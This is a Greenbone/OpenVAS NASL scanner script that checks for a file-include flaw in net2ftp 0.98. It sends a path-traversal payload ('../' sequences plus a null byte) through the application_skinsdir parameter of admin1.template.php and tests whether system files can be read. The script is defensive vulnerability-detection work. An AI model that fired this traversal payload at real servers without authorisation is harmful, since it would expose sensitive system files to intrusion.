CPE = "cpe:/a:net2ftp:net2ftp";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100943" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-12-10 13:28:59 +0100 (Fri, 10 Dec 2010)" );
	script_bugtraq_id( 45312 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "net2ftp 'admin1.template.php' Local and Remote File Include Vulnerabilities" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/45312" );
	script_xref( name: "URL", value: "http://www.net2ftp.com/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "net2ftp_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "net2ftp/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "The 'net2ftp' program is prone to a local file-include vulnerability
and a remote file-include vulnerability because the application fails to sufficiently sanitize user-supplied input.

An attacker can exploit these issues to obtain sensitive information, other attacks are also possible.

net2ftp 0.98 stable is vulnerable, other versions may also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/skins/mobile/admin1.template.php?net2ftp_globals[application_skinsdir]=" + crap( data: "../", length: 3 * 9 ) + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

